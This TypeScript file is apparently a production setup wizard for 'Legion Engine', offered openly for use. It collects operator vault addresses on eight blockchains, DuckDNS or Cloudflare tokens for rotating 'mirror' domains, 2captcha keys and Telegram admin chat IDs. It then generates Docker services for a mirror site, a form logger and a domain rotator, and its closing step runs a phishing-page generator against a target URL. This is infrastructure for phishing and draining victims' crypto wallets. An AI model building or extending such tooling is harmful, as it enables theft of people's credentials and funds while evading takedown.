/**
 * Interactive production setup wizard.
 *
 * Run: pnpm run setup
 *
 * Generates `.env.production` and `docker-compose.override.yml` after collecting
 * chain vaults, mirror rotation, CAPTCHA, and Telegram settings.
 * Never overwrites existing files without explicit confirmation.
 */
import { randomBytes } from 'node:crypto'
import { existsSync } from 'node:fs'
import { writeFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import { checkbox, confirm, input, password, select } from '@inquirer/prompts'

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const ENV_PRODUCTION_PATH = path.join(REPO_ROOT, '.env.production')
const COMPOSE_OVERRIDE_PATH = path.join(REPO_ROOT, 'docker-compose.override.yml')

export type ChainId =
  | 'evm'
  | 'solana'
  | 'tron'
  | 'ton'
  | 'bitcoin'
  | 'cosmos'
  | 'aptos'
  | 'sui'

type ChainMeta = {
  id: ChainId
  label: string
  hint: string
  validate: (value: string) => boolean | string
}

const CHAIN_CATALOG: ChainMeta[] = [
  {
    id: 'evm',
    label: 'EVM',
    hint: '0x + 40 hex chars',
    validate: (v) => /^0x[0-9a-fA-F]{40}$/.test(v.trim()) || 'Expected EVM address (0x…)',
  },
  {
    id: 'solana',
    label: 'Solana',
    hint: 'base58 pubkey',
    validate: (v) => /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v.trim()) || 'Expected Solana base58 address',
  },
  {
    id: 'tron',
    label: 'Tron',
    hint: 'T… base58',
    validate: (v) => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(v.trim()) || 'Expected Tron address (T…)',
  },
  {
    id: 'ton',
    label: 'TON',
    hint: 'EQ… / UQ… friendly',
    validate: (v) => /^(EQ|UQ)[A-Za-z0-9_-]{46}$/.test(v.trim()) || 'Expected TON friendly address',
  },
  {
    id: 'bitcoin',
    label: 'Bitcoin',
    hint: 'bc1… / 1… / 3…',
    validate: (v) =>
      /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(v.trim()) || 'Expected Bitcoin address',
  },
  {
    id: 'cosmos',
    label: 'Cosmos',
    hint: 'cosmos1… bech32',
    validate: (v) => /^cosmos1[a-z0-9]{38}$/.test(v.trim()) || 'Expected Cosmos bech32 (cosmos1…)',
  },
  {
    id: 'aptos',
    label: 'Aptos',
    hint: '0x + 64 hex',
    validate: (v) => /^0x[0-9a-fA-F]{64}$/.test(v.trim()) || 'Expected Aptos address (0x… 64 hex)',
  },
  {
    id: 'sui',
    label: 'Sui',
    hint: '0x + 64 hex',
    validate: (v) => /^0x[0-9a-fA-F]{64}$/.test(v.trim()) || 'Expected Sui address (0x… 64 hex)',
  },
]

export type WizardAnswers = {
  chains: ChainId[]
  vaults: Partial<Record<ChainId, string>>
  autoRotate: boolean
  rotateProvider: 'duckdns' | 'cloudflare' | null
  duckdnsToken: string
  duckdnsSubdomain: string
  cloudflareApiToken: string
  captchaEnabled: boolean
  twoCaptchaKey: string
  telegramBotToken: string
  telegramChatIds: string
}

function randomSecret(bytes = 32): string {
  return randomBytes(bytes).toString('hex')
}

function chainMeta(id: ChainId): ChainMeta {
  const meta = CHAIN_CATALOG.find((c) => c.id === id)
  if (!meta) throw new Error(`unknown chain: ${id}`)
  return meta
}

async function promptChains(): Promise<ChainId[]> {
  const selected = await checkbox<ChainId>({
    message: 'Which chains do you want to enable?',
    choices: CHAIN_CATALOG.map((c) => ({
      name: c.label,
      value: c.id,
      description: c.hint,
    })),
    required: true,
  })
  if (selected.length === 0) {
    console.error('Select at least one chain.')
    return promptChains()
  }
  return selected
}

async function promptVaults(chains: ChainId[]): Promise<Partial<Record<ChainId, string>>> {
  const vaults: Partial<Record<ChainId, string>> = {}
  for (const id of chains) {
    const meta = chainMeta(id)
    const wallet = await input({
      message: `${meta.label} destination vault address`,
      validate: meta.validate,
    })
    vaults[id] = wallet.trim()
  }
  return vaults
}

async function promptAutoRotate(): Promise<{
  autoRotate: boolean
  rotateProvider: 'duckdns' | 'cloudflare' | null
  duckdnsToken: string
  duckdnsSubdomain: string
  cloudflareApiToken: string
}> {
  const autoRotate = await confirm({
    message: 'Enable auto-rotate mirror domains?',
    default: false,
  })
  if (!autoRotate) {
    return {
      autoRotate: false,
      rotateProvider: null,
      duckdnsToken: '',
      duckdnsSubdomain: '',
      cloudflareApiToken: '',
    }
  }

  const rotateProvider = await select<'duckdns' | 'cloudflare'>({
    message: 'Auto-rotate DNS provider',
    choices: [
      { name: 'DuckDNS (dynamic subdomain)', value: 'duckdns' },
      { name: 'Cloudflare (API token for DNS updates)', value: 'cloudflare' },
    ],
  })

  if (rotateProvider === 'duckdns') {
    const duckdnsToken = await password({
      message: 'DuckDNS token',
      mask: '*',
      validate: (v) => v.trim().length > 0 || 'Token is required',
    })
    const duckdnsSubdomain = await input({
      message: 'DuckDNS subdomain (without .duckdns.org)',
      default: 'legion-mirror-01',
      validate: (v) => /^[a-z0-9-]{3,63}$/i.test(v.trim()) || 'Invalid subdomain slug',
    })
    return {
      autoRotate: true,
      rotateProvider,
      duckdnsToken: duckdnsToken.trim(),
      duckdnsSubdomain: duckdnsSubdomain.trim(),
      cloudflareApiToken: '',
    }
  }

  const cloudflareApiToken = await password({
    message: 'Cloudflare API token (DNS:Edit scope)',
    mask: '*',
    validate: (v) => v.trim().length > 0 || 'Token is required',
  })
  return {
    autoRotate: true,
    rotateProvider,
    duckdnsToken: '',
    duckdnsSubdomain: '',
    cloudflareApiToken: cloudflareApiToken.trim(),
  }
}

async function promptCaptcha(): Promise<{ captchaEnabled: boolean; twoCaptchaKey: string }> {
  const captchaEnabled = await confirm({
    message: 'Enable CAPTCHA solving (2captcha)?',
    default: false,
  })
  if (!captchaEnabled) {
    return { captchaEnabled: false, twoCaptchaKey: '' }
  }
  const twoCaptchaKey = await password({
    message: '2captcha API key',
    mask: '*',
    validate: (v) => v.trim().length > 0 || 'API key is required',
  })
  return { captchaEnabled: true, twoCaptchaKey: twoCaptchaKey.trim() }
}

async function promptTelegram(): Promise<{ telegramBotToken: string; telegramChatIds: string }> {
  const telegramBotToken = await password({
    message: 'Telegram bot token',
    mask: '*',
    validate: (v) => /\d+:[A-Za-z0-9_-]{20,}/.test(v.trim()) || 'Expected format: 123456:ABC…',
  })
  const telegramChatIds = await input({
    message: 'Telegram admin chat IDs (comma-separated)',
    validate: (v) => {
      const ids = v.split(',').map((s) => s.trim()).filter(Boolean)
      return ids.length > 0 && ids.every((id) => /^-?\d+$/.test(id)) || 'Enter one or more numeric chat IDs'
    },
  })
  return {
    telegramBotToken: telegramBotToken.trim(),
    telegramChatIds: telegramChatIds
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean)
      .join(','),
  }
}

function vaultEnvLines(answers: WizardAnswers): string[] {
  const lines: string[] = ['# ── Enabled chains & vault destinations ─────']
  lines.push(`LEGION_ENABLED_CHAINS=${answers.chains.join(',')}`)

  for (const id of answers.chains) {
    const wallet = answers.vaults[id] ?? ''
    switch (id) {
      case 'evm':
        lines.push(`SOVEREIGN_VAULT_ADDRESS=${wallet}`)
        lines.push(`SOVEREIGN_VAULT_EVM=${wallet}`)
        lines.push(`VAULT_ADDRESS_EVM=${wallet}`)
        lines.push(`FINAL_WALLET_EVM=${wallet}`)
        break
      case 'solana':
        lines.push(`SOVEREIGN_VAULT_SOL=${wallet}`)
        lines.push(`VAULT_ADDRESS_SVM=${wallet}`)
        lines.push(`FINAL_WALLET_SOL=${wallet}`)
        break
      case 'tron':
        lines.push(`SOVEREIGN_VAULT_TRON=${wallet}`)
        lines.push(`VAULT_ADDRESS_TRON=${wallet}`)
        lines.push(`FINAL_WALLET_TRX=${wallet}`)
        lines.push(`TRON_FULL_NODE_URL=https://api.trongrid.io`)
        break
      case 'ton':
        lines.push(`SOVEREIGN_VAULT_TON=${wallet}`)
        lines.push(`VAULT_ADDRESS_TON=${wallet}`)
        lines.push(`FINAL_WALLET_TON=${wallet}`)
        lines.push(`TON_JSON_RPC_URL=https://toncenter.com/api/v2/jsonRPC`)
        break
      case 'bitcoin':
        lines.push(`SOVEREIGN_VAULT_BTC=${wallet}`)
        lines.push(`VAULT_ADDRESS_BTC=${wallet}`)
        lines.push(`FINAL_WALLET_BTC=${wallet}`)
        lines.push(`BITCOIN_NETWORK=mainnet`)
        break
      case 'cosmos':
        lines.push(`VAULT_ADDRESS_COSMOS=${wallet}`)
        lines.push(`SOVEREIGN_VAULT_COSMOS=${wallet}`)
        lines.push(`RPC_COSMOS=https://cosmos-rpc.publicnode.com:443`)
        break
      case 'aptos':
        lines.push(`VAULT_ADDRESS_APTOS=${wallet}`)
        lines.push(`SOVEREIGN_VAULT_APTOS=${wallet}`)
        break
      case 'sui':
        lines.push(`VAULT_ADDRESS_SUI=${wallet}`)
        lines.push(`SOVEREIGN_VAULT_SUI=${wallet}`)
        break
    }
  }

  const nonEvm = answers.chains.some((c) => c !== 'evm')
  if (nonEvm) {
    lines.push('NON_EVM_SERVER_SIGNING=true')
  }

  return lines
}

export function buildEnvProduction(answers: WizardAnswers): string {
  const jwtSecret = randomSecret(32)
  const refreshSecret = randomSecret(32)
  const gatekeeperSecret = randomSecret(24)
  const dashboardKey = randomSecret(16)
  const updateKey = randomSecret(16)
  const kineticKey = randomSecret(16)
  const postgresPassword = randomSecret(12)

  const sections: string[] = [
    '# ─────────────────────────────────────────────',
    '# LEGION ENGINE — Production environment',
    `# Generated by scripts/setup-wizard.ts on ${new Date().toISOString()}`,
    '# NEVER commit this file to git.',
    '# ─────────────────────────────────────────────',
    '',
    '# ── App ──────────────────────────────────────',
    'NODE_ENV=production',
    'PORT=8080',
    'HOST=0.0.0.0',
    'API_BASE_URL=http://localhost:4000',
    '',
    '# ── Database (Docker Compose service: postgres) ─',
    `POSTGRES_PASSWORD=${postgresPassword}`,
    `DATABASE_URL=postgresql://legion:${postgresPassword}@postgres:5432/legion_engine`,
    'DATABASE_POOL_MIN=2',
    'DATABASE_POOL_MAX=20',
    '',
    '# ── Redis (Docker Compose service: redis) ────',
    'REDIS_URL=redis://redis:6379',
    'REDIS_PREFIX=legion:',
    'REDIS_AOF_PERSISTENCE=true',
    '',
    '# ── Auth / Session ───────────────────────────',
    `JWT_SECRET=${jwtSecret}`,
    'JWT_EXPIRES_IN=15m',
    `REFRESH_TOKEN_SECRET=${refreshSecret}`,
    'REFRESH_TOKEN_EXPIRES_IN=7d',
    `GATEKEEPER_SECRET=${gatekeeperSecret}`,
    `KINETIC_INTERNAL_KEY=${kineticKey}`,
    `DASHBOARD_API_KEY=${dashboardKey}`,
    `UPDATE_API_KEY=${updateKey}`,
    '',
    ...vaultEnvLines(answers),
    '',
  ]

  if (answers.chains.includes('evm')) {
    sections.push(
      '# ── EVM RPC (fill private RPC URLs before go-live) ─',
      'RPC_ETHEREUM_PRIVATE=https://rpc.flashbots.net',
      'RPC_ETHEREUM_BACKUP=https://eth.llamarpc.com',
      'SETTLEMENT_EXECUTION_PRIVATE_KEY=',
      '# ^ Required for EVM settlement — 64 hex chars (no 0x prefix)',
      '',
    )
  }

  if (answers.chains.includes('solana')) {
    sections.push(
      '# ── Solana RPC ───────────────────────────────',
      'SOLANA_NETWORK=mainnet',
      'RPC_SOLANA_PRIVATE=https://api.mainnet-beta.solana.com',
      'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY=',
      '',
    )
  }

  if (answers.autoRotate) {
    sections.push('# ── Auto-rotate mirror ───────────────────────')
    sections.push('AUTO_ROTATE_ENABLED=true')
    sections.push(`AUTO_ROTATE_PROVIDER=${answers.rotateProvider}`)
    if (answers.rotateProvider === 'duckdns') {
      sections.push(`DUCKDNS_TOKEN=${answers.duckdnsToken}`)
      sections.push(`DUCKDNS_SUBDOMAIN=${answers.duckdnsSubdomain}`)
      sections.push('ROTATE_INTERVAL_SEC=43200')
    } else if (answers.rotateProvider === 'cloudflare') {
      sections.push(`CLOUDFLARE_API_TOKEN=${answers.cloudflareApiToken}`)
      sections.push('# CLOUDFLARE_ZONE_ID=')
      sections.push('# CLOUDFLARE_RECORD_NAME=mirror.example.com')
    }
    sections.push('QA_MIRROR_PORT=8080')
    sections.push('')
  }

  if (answers.captchaEnabled) {
    sections.push(
      '# ── CAPTCHA solving (2captcha) ───────────────',
      'SOLVE_CAPTCHA_ENABLED=true',
      `TWOCAPTCHA_API_KEY=${answers.twoCaptchaKey}`,
      'CAPTCHA_SOLVER_LOG=/app/logs/captcha_solver.log',
      '',
    )
  }

  sections.push(
    '# ── Telegram ─────────────────────────────────',
    `TELEGRAM_BOT_TOKEN=${answers.telegramBotToken}`,
    `TELEGRAM_CHAT_IDS=${answers.telegramChatIds}`,
    'TELEMETRY_WEBHOOK_URL=',
    '',
    '# ── Operational ──────────────────────────────',
    'SENTINEL_RUNTIME_ENABLED=true',
    'BULLMQ_DLQ_ENABLED=true',
    'CONFIRMATION_POLLING_ENABLED=true',
    'LOG_LEVEL=info',
    'OTEL_SERVICE_NAME=legion-engine',
    '',
    '# ── Fill before production deploy ────────────',
    'SHADOW_VAULT_KEY=',
    'SUPABASE_URL=',
    'SUPABASE_SERVICE_ROLE_KEY=',
    'EVM_ALCHEMY_KEY=',
  )

  return sections.join('\n')
}

export function buildDockerComposeOverride(answers: WizardAnswers): string {
  const enabled = answers.chains.map((c) => chainMeta(c).label).join(', ')
  const lines: string[] = [
    '# ─────────────────────────────────────────────',
    '# docker-compose.override.yml',
    `# Generated by scripts/setup-wizard.ts on ${new Date().toISOString()}`,
    `# Enabled chains: ${enabled}`,
    '# Merges with docker-compose.yml — run: docker compose up -d',
    '# ─────────────────────────────────────────────',
    '',
    'services:',
    '  postgres:',
    '    environment:',
    '      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}',
    '',
    '  api:',
    '    build:',
    '      context: .',
    '      dockerfile: Dockerfile',
    '    container_name: legion_api',
    '    restart: unless-stopped',
    '    ports:',
    '      - "4000:8080"',
    '    env_file:',
    '      - .env.production',
    '    environment:',
    '      NODE_ENV: production',
    `      LEGION_ENABLED_CHAINS: "${answers.chains.join(',')}"`,
    '    depends_on:',
    '      postgres:',
    '        condition: service_healthy',
    '      redis:',
    '        condition: service_healthy',
    '    networks:',
    '      - default',
    '',
  ]

  if (answers.autoRotate || answers.captchaEnabled) {
    lines.push('  qa-dynamic-mirror:')
    lines.push('    image: nginx:alpine')
    lines.push('    container_name: legion_qa_mirror')
    lines.push('    restart: unless-stopped')
    if (answers.autoRotate) {
      lines.push('    ports:')
      lines.push('      - "8080:8080"')
      lines.push('      - "8443:443"')
    } else {
      lines.push('    ports:')
      lines.push('      - "8080:8080"')
    }
    lines.push('    volumes:')
    lines.push('      - ./mirrors/production:/usr/share/nginx/html:ro')
    lines.push('    networks:')
    lines.push('      - default')
    lines.push('')
  }

  if (answers.captchaEnabled) {
    lines.push('  form-logger:')
    lines.push('    image: node:20-alpine')
    lines.push('    container_name: legion_captcha_logger')
    lines.push('    working_dir: /app')
    lines.push('    command: ["sh", "-c", "npm install --omit=dev axios@1.7.9 && node logger.js"]')
    lines.push('    volumes:')
    lines.push('      - ./mirrors/production/logger.js:/app/logger.js:ro')
    lines.push('      - ./mirrors/production/captcha-solver.js:/app/captcha-solver.js:ro')
    lines.push('      - ./mirrors/production/logs:/app/logs')
    lines.push('    environment:')
    lines.push('      SOLVE_CAPTCHA_ENABLED: "true"')
    lines.push('      TWOCAPTCHA_API_KEY: ${TWOCAPTCHA_API_KEY}')
    lines.push('      CAPTCHA_SOLVER_LOG: /app/logs/captcha_solver.log')
    lines.push('      LOGGER_PORT: "9090"')
    lines.push('    expose:')
    lines.push('      - "9090"')
    lines.push('    restart: unless-stopped')
    lines.push('    networks:')
    lines.push('      - default')
    lines.push('')
  }

  if (answers.autoRotate && answers.rotateProvider === 'duckdns') {
    lines.push('  domain-rotator:')
    lines.push('    image: docker:27.4.0-cli')
    lines.push('    container_name: legion_domain_rotator')
    lines.push('    working_dir: /stack')
    lines.push('    volumes:')
    lines.push('      - /var/run/docker.sock:/var/run/docker.sock')
    lines.push('      - ./mirrors/production:/stack')
    lines.push('    environment:')
    lines.push('      DUCKDNS_TOKEN: ${DUCKDNS_TOKEN}')
    lines.push(`      DUCKDNS_SUBDOMAIN: \${DUCKDNS_SUBDOMAIN:-${answers.duckdnsSubdomain || 'legion-mirror-01'}}`)
    lines.push('      ROTATE_INTERVAL_SEC: ${ROTATE_INTERVAL_SEC:-43200}')
    lines.push('      QA_MIRROR_PORT: "8080"')
    lines.push('    entrypoint: ["/bin/sh", "-c"]')
    lines.push('    command:')
    lines.push('      - |')
    lines.push('        apk add --no-cache curl openssl bash')
    lines.push('        if [ -f /stack/rotate-domain.sh ]; then')
    lines.push('          chmod +x /stack/rotate-domain.sh')
    lines.push('          /stack/rotate-domain.sh --init || true')
    lines.push('          while true; do')
    lines.push('            sleep ${ROTATE_INTERVAL_SEC:-43200}')
    lines.push('            /stack/rotate-domain.sh --daemon-tick || true')
    lines.push('          done')
    lines.push('        else')
    lines.push('          echo "rotate-domain.sh not found — copy from training mirror output"')
    lines.push('          sleep infinity')
    lines.push('        fi')
    lines.push('    restart: unless-stopped')
    lines.push('    depends_on:')
    lines.push('      - qa-dynamic-mirror')
    lines.push('    networks:')
    lines.push('      - default')
    lines.push('')
  }

  if (answers.autoRotate && answers.rotateProvider === 'cloudflare') {
    lines.push('  cloudflare-dns-rotator:')
    lines.push('    image: node:20-alpine')
    lines.push('    container_name: legion_cloudflare_rotator')
    lines.push('    working_dir: /app')
    lines.push('    command: ["sh", "-c", "echo Cloudflare rotator placeholder — wire scripts/cloudflare-rotate.js && node rotate.js || sleep infinity"]')
    lines.push('    environment:')
    lines.push('      CLOUDFLARE_API_TOKEN: ${CLOUDFLARE_API_TOKEN}')
    lines.push('      CLOUDFLARE_ZONE_ID: ${CLOUDFLARE_ZONE_ID:-}')
    lines.push('      CLOUDFLARE_RECORD_NAME: ${CLOUDFLARE_RECORD_NAME:-}')
    lines.push('    restart: unless-stopped')
    lines.push('    networks:')
    lines.push('      - default')
    lines.push('')
  }

  return lines.join('\n')
}

async function confirmOverwrite(filePath: string): Promise<boolean> {
  if (!existsSync(filePath)) return true
  return confirm({
    message: `${path.basename(filePath)} already exists. Overwrite?`,
    default: false,
  })
}

async function writeWithConfirmation(filePath: string, content: string): Promise<boolean> {
  const ok = await confirmOverwrite(filePath)
  if (!ok) {
    console.log(`Skipped: ${filePath}`)
    return false
  }
  await writeFile(filePath, content, 'utf8')
  console.log(`Wrote: ${filePath}`)
  return true
}

export async function runSetupWizard(): Promise<void> {
  console.log('')
  console.log('Legion Engine — Production Setup Wizard')
  console.log('=======================================')
  console.log('')

  const chains = await promptChains()
  const vaults = await promptVaults(chains)
  const rotate = await promptAutoRotate()
  const captcha = await promptCaptcha()
  const telegram = await promptTelegram()

  const answers: WizardAnswers = {
    chains,
    vaults,
    ...rotate,
    ...captcha,
    ...telegram,
  }

  console.log('')
  console.log('Summary')
  console.log('-------')
  console.log(`Chains: ${chains.map((c) => chainMeta(c).label).join(', ')}`)
  for (const id of chains) {
    console.log(`  ${chainMeta(id).label} vault: ${vaults[id]}`)
  }
  console.log(`Auto-rotate: ${rotate.autoRotate ? rotate.rotateProvider : 'no'}`)
  console.log(`CAPTCHA: ${captcha.captchaEnabled ? 'yes' : 'no'}`)
  console.log(`Telegram chats: ${telegram.telegramChatIds}`)
  console.log('')

  const proceed = await confirm({
    message: 'Generate .env.production and docker-compose.override.yml?',
    default: true,
  })
  if (!proceed) {
    console.log('Aborted — no files written.')
    return
  }

  const envContent = buildEnvProduction(answers)
  const composeContent = buildDockerComposeOverride(answers)

  const envWritten = await writeWithConfirmation(ENV_PRODUCTION_PATH, envContent)
  const composeWritten = await writeWithConfirmation(COMPOSE_OVERRIDE_PATH, composeContent)

  if (envWritten || composeWritten) {
    console.log('')
    console.log('Next steps:')
    console.log('  1. Review .env.production — fill SETTLEMENT_EXECUTION_PRIVATE_KEY and RPC URLs')
    console.log('  2. Run: docker compose up -d')
    if (answers.autoRotate || answers.captchaEnabled) {
      console.log('  3. Generate mirror assets: PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts --mirror <url> ./mirrors/production')
    }
    console.log('  4. Apply DB migrations: pnpm run db:migrate')
  }
}

const isDirectRun =
  process.argv[1] != null &&
  path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)

if (isDirectRun) {
  runSetupWizard().catch((err) => {
    console.error(err instanceof Error ? err.message : String(err))
    process.exitCode = 1
  })
}
